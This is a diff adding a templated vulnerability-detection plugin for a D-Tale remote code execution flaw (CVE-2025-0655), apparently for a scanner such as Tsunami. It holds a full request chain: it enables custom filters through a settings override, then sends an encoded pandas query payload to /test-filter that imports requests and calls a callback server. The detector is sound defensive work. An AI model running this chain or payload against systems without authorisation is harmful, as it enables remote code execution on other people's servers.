@@ -1,0 +1,171 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Dtale_CVE_2025_0655"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "frkngksl for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2025_0655"
+  }
+  severity: CRITICAL
+  title: "D-Tale Remote Code Execution (CVE-2025-0655)"
+  description: 
+    "D-Tale is vulnerable to a Remote Code Execution vulnerability, which was fixed"
+    " in version 3.16.1, due to Global State Override mechanism."
+    " Specifically, this vulnerability leverages the ability to manipulate"
+    " global  application settings to activate the enable_custom_filters"
+    " feature, typically restricted to trusted environments. Once enabled,"
+    " the /test-filter endpoint of the Custom Filters functionality can be"
+    " exploited to execute arbitrary system commands."
+  recommendation: "You can upgrade your D-Tale instances to 3.16.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-0655"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+# a little different from the exposed UI one, but the original Java plugin uses this.
+# there might be some small differences between the two or depending on config.
+
+actions: {
+  name: "fingerprint_dtale"
+  http_request: {
+    method: GET
+    uri: "/"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<p>You should be redirected automatically to the target URL: <a href=\"/dtale" }
+        ]
+      }
+    }
+  }
+}
+
+# original only does OOB RCE.
+
+actions: {
+  name: "create_sample_table"
+  http_request: {
+    method: POST
+    uri: "/dtale/upload"
+    headers: [
+      { name: "Content-Type" value: "multipart/form-data; boundary=-" }
+    ]
+    data: '---\nContent-Disposition: form-data; name="data.csv"; filename="data.csv"\nContent-Type: text/csv\n\ntest,data\n\n---\nContent-Disposition: form-data; name="header"\n\ntrue\n---\nContent-Disposition: form-data; name="separatorType"\n\ncomma\n---\nContent-Disposition: form-data; name="separator"\n\n-----\n'
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"success\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"data_id\":\"([0-9_]+)\""
+            variable_name: "DATA_ID"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: ["cleanup_sample_table"]
+}
+
+# Enable custom filters. This is the key difference between the Dtale ExposedUI detector
+# and the CVE-2025-0655 detector
+
+actions: {
+  name: "enable_custom_filters"
+  http_request: {
+    method: GET
+    uri: "/dtale/update-settings/{{ DATA_ID }}?settings=%7B%22enable_custom_filters%22%3Atrue%7D"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"success\":true" }
+        ]
+      }
+    }
+  }
+}
+
+# we don't really need any checks on the response since we had thorough checks before this step.
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: GET
+    uri: "/dtale/test-filter/{{ DATA_ID }}?query={{ payload }}"
+  }
+}
+
+actions: {
+  name: "cleanup_sample_table"
+  http_request: {
+    method: GET
+    uri: "/dtale/cleanup-datasets?dataIds={{ DATA_ID }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+# we can afford to sleep longer given the fingerprint check and response checks above
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 3000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+# changed the payload from the ExposedUI detector to be more reliable.
+# Python requests module should be available more often.
+
+workflows: {
+  variables: [
+    { name: "payload" value: "%40pd.core.frame.com.builtins.__import__%28%22requests%22%29.get%28%22{{ T_CBS_URI }}%22%29" }
+  ]
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_dtale",
+    "create_sample_table",
+    "enable_custom_filters",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
